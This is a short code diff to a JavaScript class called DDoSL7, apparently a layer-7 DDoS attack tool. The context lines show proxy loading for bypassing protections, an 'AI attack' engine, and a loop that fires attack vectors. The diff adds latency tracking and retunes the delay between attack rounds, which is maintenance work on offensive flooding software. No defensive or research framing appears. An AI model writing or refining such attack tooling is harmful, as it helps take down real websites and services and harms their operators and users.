@@ -97,6 +97,8 @@ class DDoSL7 {
         this.safeModeActive = false;
         this.safeModeCooldown = 0;
         this.workers = [];
+        this.latencyHistory = [];
+        this.emaLatency = 0;
         this.bypasser = new Bypasser(this.io);
         this.bypasser.loadProxiesFromFile('proxies.txt');
         this.ai = new AIAttackDefenseEngine();
@@ -325,8 +327,9 @@ class DDoSL7 {
                 return;
             }
             this.executeVectors();
-            // Gunakan setTimeout agar Event Loop bisa memproses monitoring di sela-sela serangan
-            setTimeout(runNext, this.safeModeActive ? 500 : 150);
+            // Increase breathing room for the event loop
+            const nextDelay = this.safeModeActive ? 1000 : 250;
+            setTimeout(runNext, nextDelay);
         };
         runNext();
     }
